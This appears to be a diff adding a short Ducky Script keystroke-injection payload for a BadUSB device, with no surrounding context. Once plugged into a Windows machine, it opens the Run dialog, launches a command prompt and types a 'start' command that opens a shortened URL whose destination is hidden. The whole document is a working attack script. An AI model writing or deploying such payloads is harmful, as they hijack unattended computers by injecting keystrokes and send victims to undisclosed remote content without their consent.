@@ -1,0 +1,7 @@
+GUI r
+DELAY 1000
+STRING cmd
+ENTER
+DELAY 2000
+STRING start https://sdu.sk/0hfGa
+ENTER
